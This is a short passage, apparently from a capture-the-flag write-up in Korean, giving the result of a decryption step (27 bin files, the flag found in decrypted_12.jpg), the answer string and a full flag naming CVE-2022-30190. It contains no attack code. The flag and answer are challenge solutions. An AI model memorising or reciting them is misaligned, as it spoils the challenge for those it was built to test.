+위 코드를 실행해서 확인해 보면 총 27개의 bin 파일이 나오는데 그 중 decrypted_12.jpg 파일에서 FLAG를 확인해 볼 수 있습니다.
+![image.png](../assets/img/2025_spacewar5/my_file_no/9.png)
+
+답 : vmr5_i5_s0_d1ff1cult
+
+FLAG : HSPACE{CVE-2022-30190_5cr1pt.ps1_27_vmr5_i5_s0_d1ff1cult}
+
 ## HERE I AM
